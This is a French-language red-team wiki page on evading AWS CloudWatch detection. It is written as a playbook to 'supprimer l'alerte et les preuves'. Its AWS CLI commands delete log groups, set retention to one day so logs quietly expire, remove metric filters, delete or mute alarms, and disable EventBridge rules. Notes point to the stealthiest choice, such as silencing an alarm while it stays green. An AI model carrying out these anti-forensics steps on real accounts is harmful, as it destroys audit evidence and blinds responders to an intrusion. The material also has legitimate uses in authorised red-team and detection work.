---
title: "CloudWatch : supprimer des log groups, des metric filters et des alarmes"
order: 4
description: "Supprimer des log groups, des alarmes et des metric filters pour supprimer l'alerte et les preuves CloudWatch."
keywords:
  - CloudWatch
  - log group
  - alarm
  - metric filter
  - suppression
---

# CloudWatch

CloudWatch détient les logs d'applications et de services, les metric filters qui transforment des motifs de logs en métriques, et les alarmes qui alertent un répondant. C'est à la fois une preuve et le chemin d'alerte : supprimer des log groups retire donc l'enregistrement tandis que supprimer ou désactiver des alarmes retire la notification.

## Supprimer ou faire expirer les logs

```bash
aws logs describe-log-groups
aws logs delete-log-group --log-group-name <lg>
# or silently age everything out to the minimum
aws logs put-retention-policy --log-group-name <lg> --retention-in-days 1
```

## Briser le chemin d'alerte

```bash
# remove the metric filter that feeds an alarm
aws logs delete-metric-filter --log-group-name <lg> --filter-name <f>
# delete or neuter the alarm itself
aws cloudwatch delete-alarms --alarm-names <a>
aws cloudwatch disable-alarm-actions --alarm-names <a>
# disable the EventBridge rule that routes an event to a responder
aws events disable-rule --name <rule>
```

## Notes d'exploitation

- `disable-alarm-actions` laisse l'alarme présente et au vert tout en réduisant au silence son action SNS ou Lambda, ce qui est plus discret que de la supprimer.
- Les log groups livrés vers un compte central (un compte de journalisation dans une organisation) conservent la preuve même après la suppression du groupe local.
- Les metric filters sont le pont habituel entre un motif de log (par exemple un login root) et une alarme ; retirer le filtre aveugle l'alarme sans y toucher.

## Outils

- **AWS CLI** (`logs`, `cloudwatch`, `events`) : contrôle des log groups, filtres, alarmes et règles.
- **Pacu** (`detection__disruption`) : perturbe CloudWatch aux côtés des autres services de détection.

## Références

- [HackTricks Cloud : contournement de défense AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [AWS : API DeleteLogGroup](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_DeleteLogGroup.html)
- [AWS : disable-alarm-actions](https://docs.aws.amazon.com/AmazonCloudWatch/latest/APIReference/API_DisableAlarmActions.html)
- [Stratus Red Team : techniques de contournement de défense AWS](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Datadog Security Labs : recherche sur le contournement de défense AWS](https://securitylabs.datadoghq.com/)
